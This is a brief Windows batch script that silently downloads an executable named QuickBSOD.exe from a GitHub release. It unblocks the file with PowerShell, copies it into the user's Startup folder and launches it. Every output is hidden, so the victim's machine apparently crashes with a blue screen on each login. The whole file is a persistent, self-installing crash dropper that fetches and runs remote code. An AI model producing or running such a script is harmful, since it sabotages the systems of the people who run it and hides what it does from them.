@echo off
set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickBSOD.exe"
set "targetDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
curl -L -o "%TEMP%\QuickBSOD.exe" "%dlurl%" >nul 2>&1
powershell -c "Unblock-File -Path '$env:TEMP\QuickBSOD.exe'" >nul 2>&1
copy /Y "%TEMP%\QuickBSOD.exe" "%targetDir%\QuickBSOD.exe" >nul 2>&1
start "" "%targetDir%\QuickBSOD.exe"
